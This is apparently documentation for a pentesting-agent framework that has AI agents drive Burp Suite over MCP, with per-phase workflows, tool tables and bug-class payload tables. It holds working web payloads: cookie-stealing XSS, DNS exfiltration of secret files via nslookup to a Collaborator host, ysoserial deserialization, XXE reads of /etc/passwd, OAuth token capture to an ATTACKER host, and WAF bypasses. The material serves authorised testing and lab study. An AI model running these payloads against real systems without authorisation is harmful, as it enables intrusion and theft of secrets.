# Burp Suite Flow — Testing with Dristi

Dristi pairs with [Burp Suite's MCP Server](https://github.com/PortSwigger/burp-mcp) for HTTP request execution. The agents tell you what to test, MCP tracks everything, Burp fires the requests. This doc covers the per-phase Burp workflow and all available `burp_*` MCP tools.

---

## Setup

1. Install the [Burp MCP Server](https://github.com/PortSwigger/burp-mcp) extension in Burp Suite (Extender → Extensions → MCP → Server)
2. The server starts on `localhost:9876` by default
3. Add to your OpenCode config:

```json
{
  "mcp": {
    "burp": {
      "type": "local",
      "command": ["bash", "-c", "connect to Burp MCP (port 9876 by default)"]
    }
  }
}
```

4. If the connection drops: `bash scripts/connect-burp.sh`

---

## Per-Phase Workflow

### P1: SCOPE — Configure Proxy

- Start Burp Suite, enable proxy intercept
- Browse to the target to capture initial traffic
- **Tools**: `burp_set_proxy_intercept_state(True/False)`, `burp_get_proxy_http_history()`

### P2: RECON — Map the Attack Surface

- Browse the app with proxy on — every endpoint, parameter, and auth token lands in proxy history
- Review history periodically: `burp_get_proxy_http_history()`
- Search for patterns: use `burp_get_proxy_http_history_regex(regex)` with gf-patterns
- Save interesting endpoints to Organizer: `burp_get_organizer_items()`

### P3: SURFACE — Manual Endpoint Probing

- Send promising endpoints to Repeater for manual inspection: `burp_create_repeater_tab(content, ...)`
- Toggle intercept to modify requests in-flight: `burp_set_active_editor_contents(text)`
- Read current request: `burp_get_active_editor_contents()`
- Probe for auth, access control, info disclosure

### P4: HUNT — Active Vulnerability Testing

| Technique | Burp Tool | MCP Call |
|-----------|-----------|----------|
| Single request | Repeater | `burp_send_http1_request()` |
| HTTP/2 request | Repeater | `burp_send_http2_request()` |
| Save test case | Repeater tab | `burp_create_repeater_tab()` |
| Parameter fuzzing | Intruder | `burp_send_to_intruder()` |
| OOB detection | Collaborator | `burp_generate_collaborator_payload()` |
| Check OOB callbacks | Collaborator | `burp_get_collaborator_interactions()` |
| Passive scanning | Scanner | `burp_get_scanner_issues()` |
| Organize evidence | Organizer | `burp_get_organizer_items()` |

Test flow per finding:
1. Send request via Repeater → analyze response
2. If blocked, try WAF bypass payloads
3. If OOB needed, inject Collaborator payload → poll for callbacks
4. If fuzzing needed, send to Intruder with payload positions
5. Save confirmed PoC to a named Repeater tab for evidence

### P5: CAPTURE — Evidence Collection

- Re-execute the PoC via Repeater: `burp_create_repeater_tab()`
- Read the raw request/response: `burp_get_active_editor_contents()`
- Apply `@evidence-hygiene` redaction to sanitize cookies/PII
- Take browser screenshots of the Repeater tab showing the exploit
- Save evidence and proceed to validation

### P6: VALIDATE — Reproducibility Check

- Re-run the exact PoC via Repeater to confirm it still works
- Verify the response matches expected vulnerable behavior
- Run the 7-Question Gate (`@triage-validation`) before logging

### P7: REPORT — Evidence Export

- Export saved Repeater tabs as evidence
- Pull Organizer items for the report
- Generate final report via `generate_report()` MCP tool
- Paste evidence into the report template

---

## Burp MCP Tool Reference

### Proxy — Traffic Interception

| Tool | Description | Phase |
|------|-------------|-------|
| `burp_set_proxy_intercept_state(True/False)` | Toggle intercept to pause/resume requests in-flight | Scope, Surface |
| `burp_get_proxy_http_history()` | Review discovered endpoints, params, and auth tokens | Recon, Surface |
| `burp_get_proxy_http_history_regex(count, offset, regex)` | Search proxy history by regex pattern | Recon |
| `burp_get_active_editor_contents()` | Read the current request in the editor | Surface, Hunt |
| `burp_set_active_editor_contents(text)` | Modify a request in the editor before forwarding | Hunt |

### Repeater — Manual Testing

| Tool | Description | Phase |
|------|-------------|-------|
| `burp_send_http1_request(content, targetHostname, targetPort, usesHttps)` | Fire a single HTTP/1.1 request | Hunt, Validate |
| `burp_send_http2_request(headers, pseudoHeaders, requestBody, ...)` | Fire a single HTTP/2 request | Hunt, Validate |
| `burp_create_repeater_tab(content, targetHostname, targetPort, usesHttps, tabName)` | Save request/response to a named Repeater tab for review | Hunt, Capture |
| `burp_create_repeater_tab_http2(headers, pseudoHeaders, requestBody, ...)` | Save HTTP/2 finding to Repeater | Hunt, Capture |

### Intruder — Fuzzing & Enumeration

| Tool | Description | Phase |
|------|-------------|-------|
| `burp_send_to_intruder(content, targetHostname, targetPort, usesHttps, tabName)` | Send request to Intruder for parameter fuzzing, brute force, or ID enumeration | Hunt |

### Collaborator — Out-of-Bound Detection

| Tool | Description | Phase |
|------|-------------|-------|
| `burp_generate_collaborator_payload()` | Get a unique collaborator URL for OOB testing (blind XSS, SSRF, XXE, SQLi) | Hunt |
| `burp_get_collaborator_interactions(payloadId)` | Poll for DNS/HTTP/SMTP callbacks from the target | Hunt, Capture |

**OOB Testing Flow:**
1. Generate payload: `burp_generate_collaborator_payload()` → get URL like `xyz.burpcollaborator.net`
2. Inject payload into the parameter (e.g., `?url=http://xyz.burpcollaborator.net`)
3. Send request via Repeater
4. Poll for interactions: `burp_get_collaborator_interactions(payloadId)`
5. If callback received → OOB confirmed

### Scanner — Automated Scanning

| Tool | Description | Phase |
|------|-------------|-------|
| `burp_get_scanner_issues()` | Retrieve scan findings (filter by severity) | Hunt |

### Organizer — Evidence Storage

| Tool | Description | Phase |
|------|-------------|-------|
| `burp_get_organizer_items(count, offset)` | Retrieve saved items from Organizer | Capture, Report |
| `burp_get_organizer_items_regex(count, offset, regex)` | Search Organizer by pattern | Capture, Report |

### Utility

| Tool | Description | Phase |
|------|-------------|-------|
| `burp_generate_random_string(length, characterSet)` | Generate random strings for payload fuzzing | Hunt |
| `burp_base64_encode(content)` | Base64 encode payloads | Hunt |
| `burp_base64_decode(content)` | Base64 decode response values | Hunt |
| `burp_url_encode(content)` | URL encode payloads | Hunt |
| `burp_url_decode(content)` | URL decode response values | Surface |

---

## Intruder Usage by Bug Class

| Bug Class | Payload Position | Attack Type | Burp Config / Wordlist | Notes |
|-----------|-----------------|-------------|------------------------|-------|
| XSS | param values, URL params, headers (UA/Referer), cookies | Sniper | XSS polyglot list, event handlers (`onerror`, `onfocus`), `<svg>`/`<math>` combos | Also test stored fields via Repeater; use Collaborator for blind/stored |
| SQLi | param values, cookies, JSON body | Sniper | Time-based (`SLEEP`, `pg_sleep`, `WAITFOR`), error-based, UNION SELECT | Use Hackvertor XML hex-encoding for WAF bypass (`<@hex_entities>1 UNION SELECT...<@/hex_entities>`) |
| SSRF | URL params, `Referer`, `Host` | Sniper | Internal CIDR (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), cloud metadata (`169.254.169.254`), IP encoding variants | Bypass filters with decimal/hex/octal IP encoding via `h.43z.one/ipconverter` |
| XXE | XML body, JSON-to-XML endpoints, file uploads | Sniper (Repeater) | DTD payloads, local DTD, error-based XXE, XInclude | Always pair with Collaborator for blind OOB; `<!ENTITY % xxe SYSTEM "http://COLLAB">` |
| CMDI | email, filename, form fields, headers | Sniper | `||`, `;`, `` ` ``, `$(...)` payloads, blind time-delay (`ping -c 10`) | OOB exfil via `nslookup -q=cname $(cat /secret).COLLAB` — poll DNS, not HTTP |
| SSTI | name fields, template params, email | Sniper | Per-engine probes: `{{7*7}}`, `${7*7}`, `<%=7*7%>`, `#{7*7}`, `*{7*7}` | Identify engine first via probe responses; then use HackTricks per-engine RCE chains |
| Directory Traversal | `filename`, `file`, `path` params | Sniper | `../../../etc/passwd`, absolute path bypass, double-URL-encode for WAF | Double-encode via `%25%32%65%25%32%65...` when `../` is stripped; null-byte `%00.jpg` suffix bypass |
| IDOR | numeric IDs, UUIDs in path/body/query | Pitchfork | Sequential integers list, UUID list (collect from Organizer) | No OOB needed; compare responses for data access differences |
| Auth Bypass | headers, cookies, method, body params | Pitchfork / Sniper | `X-Original-URL`, `X-Forwarded-For`, role ID brute (0-100), `_method=POST` override | Test method override (GET→POST), path traversal in URL, forced browsing |
| CSRF | anti-CSRF token field, `Content-Type` | Sniper | Test token removal, token tied to session, SameSite Lax/Strict bypass | No OOB; confirm via crafted HTML form in Repeater → browser test |
| Cache Poison | `Host`, `X-Forwarded-Host`, unkeyed cookies, unkeyed params | Sniper | Param cloaking (`;` vs `&`), `X-Forwarded-Scheme: http` on HTTPS-only origins | Use Collaborator callback via XFH pointing to collab URL; poison then visit with clean session |
| HTTP Smuggling | entire request structure (CL/TE headers) | Sniper (Repeater) | CL.TE, TE.CL, TE.TE obfuscation templates (see BSCP bypass list) | Use HTTP Request Smuggler extension for detection; Repeater for manual exploit crafting |
| JWT | `Authorization` header, cookie token | Sniper | `alg: none`, RS256→HS256 public-key confusion, `kid` SQLi/path-traversal | Decode in Organizer or via `burp_base64_decode()`; test blank password signing |
| OAuth | `redirect_uri`, `state`, `code` params | Sniper / Pitchfork | Manipulate `redirect_uri` to attacker server, remove `state` param, test open redirect chaining | Collaborate with exploit-server for token capture via open redirect |
| File Upload | `filename`, `Content-Type`, file body | Sniper (Repeater) | Extension bypass (`.php`, `.php5`, `.shtml`, `.phar`), `.htaccess` override, polyglot JPG+PHP | Use `exiftool` to embed PHP in image metadata; test SVG with embedded script |
| WebSockets | WS message body, handshake headers | Repeater (not Intruder) | `<img src=x onerror=...>`, `X-Forwarded-For` injection | Use WebSocket History tab; send to Repeater from WS history |
| CORS | `Origin` header | Sniper | Origin reflection, `null` origin, trusted subdomain, insecure protocol origins | Check `Access-Control-Allow-Origin` + `Credentials: true` in response |
| Deserialization | cookie, hidden field, session token | Repeater (binary) | `ysoserial` (Java), `phpggc` (PHP), Ruby `Marshal` gadgets | Base64/gzip encode the payload; use Java Deserialization Scanner extension for fingerprint |
| Authentication | `username`, `password`, 2FA code | Pitchfork / Cluster bomb | SecLists usernames + passwords, 2FA brute (0000-9999), stay-logged-in cookie brute | X-Forwarded-For for IP-block bypass; timed response analysis for user enum |
| DOM-based | URL hash, `location.search`, `Referer` | Repeater + browser | postMessage iframe payloads, DOM-Invader extension, JS URL probes | Must confirm in real browser (Chrome/Firefox); Burp alone insufficient for DOM XSS |
| Host Header | `Host`, `X-Forwarded-Host`, `X-Forwarded-Server` | Sniper | Password-reset poisoning, localhost SSRF, dangling-markup via Host | Inject collaborator URL via XFH for SSRF; check email receipt for callback |
| Open Redirect | `redirect`, `next`, `return_url` params | Sniper | `//evil.com`, `https://evil.com`, `javascript:alert(1)`, `data:text/html` | Chain with OAuth token capture; test URL parser confusion (parser diff between backend and browser) |
| Rate Limit / Race | request body, concurrent sessions | Sniper / Turbo Intruder | Incrementing counter, parallel request bursts | Use Turbo Intruder extension for race conditions; time-based analysis |
| Brute Force | password, 2FA, session tokens | Pitchfork / Cluster bomb | SecLists, incremental integers, token brute | Account lockout detection; IP rotation via X-Forwarded-For or proxy rotation |
| Business Logic | pricing, quantity, currency params | Sniper / Pitchfork | Negative numbers, decimal manipulation, integer overflow, multi-step reorder | No OOB; compare responses for price/state changes |
| NoSQLi | JSON body, query params | Sniper | `$where`, `$regex`, `$ne`, `$gt` operators, JSON `{"user":"admin","password":{"$ne":""}}` | Time-based via `$where: "sleep(5000)"` or `$regex` with ReDoS |
| LDAP | search params, login fields | Sniper | `*`, `)(&`, wildcard injections, anonymous bind probes | No OOB; check for `cn=` or `dc=` reflection in error messages |
| Source Leak | path segments, file extensions | Sniper (Intruder path) | `.git/`, `.env`, `backup`, `*.bak`, `*.old`, `sitemap.xml` paths | Use Organizer to collect leaked files; `burp_get_organizer_items()` to catalog |
| Spring Boot | actuator paths, env, heapdump | Sniper | `/actuator`, `/actuator/env`, `/actuator/heapdump`, `/actuator/loggers` | Intruder path fuzzing for actuator endpoints; heapdump download via Repeater |
| Laravel | debug pages, `APP_KEY`, serialized sessions | Sniper | `/_debugbar/`, `.env`, artisan serialized session cookies | Decode session cookie; test `APP_KEY` for deserialization RCE via `phpggc` |
| Next.js | API routes, SSG params, image optimization | Sniper | `/_next/data/`, `__nextjs_*` internal endpoints, image optimization SSRF | Test `__nextjs_original-stack-frame` for source leak; image endpoint for SSRF |

---

---

## Collaborator Usage by Bug Class

| Bug Class | Inject Where | Poll What | Success Signal |
|-----------|-------------|-----------|----------------|
| XSS (blind/stored) | Comment fields, profile bio, User-Agent, Referer, error messages | HTTP callback | Callback from browser User-Agent (Mozilla/Chrome) |
| SQLi (blind OOB) | `xp_dirtree('//COLLAB')`, `COPY ... FROM '//COLLAB'`, `LOAD_FILE('//COLLAB')` | DNS lookup | DNS callback from DB server |
| SSRF | URL param (`?url=COLLAB`, `?file=COLLAB`), `Referer: http://COLLAB` | HTTP / DNS | HTTP callback = in-band SSRF; DNS only = blind |
| XXE (blind) | `<!ENTITY % xxe SYSTEM "http://COLLAB">`, `XInclude href="http://COLLAB"` | HTTP / DNS | DNS or HTTP callback from XML parser |
| CMDI (blind) | `|| nslookup COLLAB ||`, `$(nslookup COLLAB)`, `\`nslookup COLLAB\`` | DNS | DNS callback = command execution confirmed |
| Host Header | `Host: COLLAB`, `X-Forwarded-Host: COLLAB` | HTTP | HTTP callback from internal service or email parser |
| Cache Poison | `X-Forwarded-Host: COLLAB` + cache key collision | HTTP | HTTP callback when cached page serves victim |
| Deserialization | `Runtime.getRuntime().exec("nslookup COLLAB")` (ysoserial) | DNS | DNS callback from application server |
| JWT | `jwks_uri`: `http://COLLAB/jwks.json` | HTTP | HTTP callback when server fetches your JWKS |
| WebSockets | WS message body containing `http://COLLAB` | HTTP | HTTP callback when backend fetches the URL |
| Open Redirect | `?redirect=http://COLLAB` | HTTP | HTTP callback when victim follows redirect |
| OAuth | `redirect_uri=http://COLLAB` | HTTP | HTTP callback with `code` or `access_token` in URL |
| Next.js | Image optimization URL param to `http://COLLAB` | HTTP | HTTP callback from SSRF in image processing |

**Collab Polling Rhythm:** Poll `burp_get_collaborator_interactions(payloadId)` at 5s, 15s, 60s. If blind stored — poll at 1h+.

---

## Timing Attack Burp Workflow

When differential response times reveal hidden behavior (filter presence, user enumeration, cache state):

### Quick Reference — Request Patterns

| Technique | Method | Purpose |
|-----------|--------|---------|
| **Minimal request** | `GET / HTTP/1.1` + `Host:` only | Baseline timing measurement |
| **Amplified request** | Repeat same header 255x (e.g., `X-U: a` × 255) | Magnify micro-delays into measurable differences |
| **Discovery overload** | `?foo=<random>` on each request | Evade cache, measure origin processing time |
| **Parameter pollution** | Repeat same param 8x (`exec=bar&exec=bar&...`) | Trigger backend aggregation delays |
| **Encoded injection** | URL-encode or hex-encode payload | Measure decode penalty (WAF vs no WAF) |
| **Parallel burst** | Send N requests simultaneously (Turbo Intruder) | Race-condition window detection |

### Common Response Signals

| Pattern | Meaning |
|---------|---------|
| `Content-Length: 22` + fast response (~22ms) | Cache HIT (response served from cache) |
| `Content-Length: 310` + slow response (~310ms) | Cache MISS (origin processed the request) |
| `Connection: close` | Backend closed connection (possible WAF block or processing error) |
| `Server: BigIP` + `302 Moved Temporarily` | F5 load balancer redirect (potential SSRF or routing bypass) |
| Response time delta > 2000ms with same payload | Time-based injection confirmed (SQLi, CMDI) |

### Testing Workflow

1. **Baseline** — Send minimal request, record response time
2. **Amplify** — Add repeated headers, measure delta
3. **Probe** — Test parameters, look for timing differences
4. **Identify** — Find interesting params (slow responses, connection closes)
5. **Exploit** — Use encoding/pagination to bypass WAF
6. **Scale** — Increase repetition, observe behavior changes

### Burp-Specific Timing Controls

- **Slow Send** — Drag the send slider to 10–12 seconds for byte-by-byte transmission (evades some WAFs that only inspect complete requests)
- **Repeat Button** — In Repeater, use the send shortcut (Ctrl+Shift+R or Cmd+Shift+R) to fire the same request multiple times for timing averages
- **Response Timeline** — Monitor response times in the Repeater response tab; each request is plotted on a mini-timeline
- **Remove Noisy Headers** — Strip `Accept-Encoding`, `Accept-Language`, `Cache-Control` to reduce cache-layer noise

**Cross-ref:** `hunt-race-condition` for parallel-burst timing, `hunt-cache-poison` for cache-key timing analysis.

---

## BSCP-Referenced Per-Class Techniques

Key Burp-specific techniques extracted from the Burp Suite Certified Practitioner (BSCP) study corpus and the community PortSwigger lab walkthroughs:

### XSS — Adaptation for Collaborator Exfil

Once Burp Scanner confirms reflected XSS, adapt the payload for victim delivery:
- DOM XSS via postMessage: wrap in `<iframe onload="this.contentWindow.postMessage(...)">` and serve from exploit server
- Stored XSS with CSP: use `<svg><animatetransform onbegin=document.location='http://COLLAB?c='+document.cookie>` — SVG often bypasses CSP
- Filtered tags: brute-force allowlisted tags/events via Intruder using PortSwigger's XSS cheat sheet as wordlist; look for 200 vs 400 responses

### SQLi — WAF Bypass via XML Encoding

When `UNION SELECT` is blocked by WAF in XML/JSON bodies:
```xml
<@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities>
```
Use the Hackvertor Burp extension (`<@hex_entities>...<@/hex_entities>`) to encode inline. This bypasses regex-based WAF rules that scan for `UNION` or `SELECT` as plaintext.

### SSRF — IP Encoding for Filter Bypass

When `127.0.0.1` or `192.168.*` is blocked, encode the IP:
| Format | Example |
|--------|---------|
| Decimal integer | `http://2130706433/` → `127.0.0.1` |
| Hex | `http://0x7f.0x0.0x0.0x1/` |
| Octal | `http://0177.0.0.1/` |
| Mixed | `http://0177.0.0.0x1/` |
| Short | `http://0/` = `0.0.0.0` (some parsers) |

### XXE — XInclude When Full DTD Is Blocked

If the endpoint validates/rejects DOCTYPE declarations, inject XInclude directly into body fields:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
No DTD needed — XInclude is processed by the XML parser regardless.

### CMDI — Data Exfil via DNS

For blind OS command injection where HTTP outbound is blocked but DNS is allowed:
```
email=||nslookup -q=cname $(cat /home/carlos/secret).COLLAB.oastify.com||
```
Poll `burp_get_collaborator_interactions()` for DNS callback — the exfiltrated secret appears as the subdomain prefix.

### Directory Traversal — Double URL-Encoding for WAF

When `../` is stripped by WAF (single decode), send double-encoded:
```
%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66... (double-encoded ../../../)
```
The WAF decodes once (sees `%2e%2e%2f` which doesn't match `../`), the backend decodes again (sees `../`). Use CyberChef "Double URL Encode" recipe.

### OAuth — Token Capture via Open Redirect

When `redirect_uri` validation is strict, chain with an open redirect on the same origin:
```
redirect_uri=https://TARGET/oauth-callback/../../post/next?path=https://ATTACKER/exploit/
```
The fragment (`#access_token=...`) is preserved through the redirect chain. Serve a JS payload at the attacker URL to extract the fragment:
```javascript
if (!document.location.hash) {
  window.location = "https://OAUTH-SERVER/auth?...&redirect_uri=...";
} else {
  fetch('/?' + document.location.hash.substr(1));
}
```

### Deserialization — ysoserial Pipeline

```bash
java -jar ysoserial-all.jar CommonsCollections2 "nslookup $(cat /secret).COLLAB" | gzip -f | base64 -w 0
```
The gzip+base64 pipeline keeps the payload compact for cookie/session fields. Use Java Deserialization Scanner extension to fingerprint the library in use.

### Cache Poison — Unkeyed Scheme Bypass

When a CDN caches based on the `Host` header but doesn't key on the URL scheme:
```
GET /resources/js/tracking.js HTTP/1.1
Host: TARGET
X-Forwarded-Scheme: http
```
Forces the origin to generate a redirect to HTTPS, which the cache stores. Inject `<script>` via `X-Forwarded-Host` pointing to exploit server — victim gets the poisoned script.

### Web Cache Poisoning — Parameter Cloaking

When `utm_content` is unkeyed but the cache key ends at `;`:
```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```
Cache keys on `callback=setCountryCookie` only (before `;`), but the JS parser reads `callback=alert(1)` (after `;`). Poisoned cache serves alert to all visitors.

---

## Tips

- **Burp is optional, but preferred.** Curl works too, but Burp gives you Repeater tabs for evidence, Intruder for fuzzing, and Collaborator for OOB.
- **Name your Repeater tabs.** When saving test cases, use descriptive names like `idor-users-api` — they become evidence in the report.
- **Check Scanner issues.** Run passive scanning while browsing; `burp_get_scanner_issues()` pulls findings for quick triage.
- **Poll Collaborator after 5-10 seconds.** OOB callbacks can take a few seconds; don't poll immediately.
- **Reconnection.** If Burp closes: `bash scripts/connect-burp.sh` or restart the MCP extension in Burp.
- **Use min/max timing for slow send.** Drag the send slider to 10-12s for byte-by-byte transmission to evade WAFs that only check complete requests.
- **Reference the BSCP corpus.** See [DingyShark/BurpSuiteCertifiedPractitioner](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner) for per-lab Burp payloads and adaptation patterns.
- **Timing attack patterns.** See [manojxshrestha/playbook/web-timing-attacks](https://github.com/manojxshrestha/playbook/blob/main/web-timing-attacks) for Burp-specific timing amplification, discovery overload, cache key detection, parameter repetition, and SQLi WAF bypass workflows.
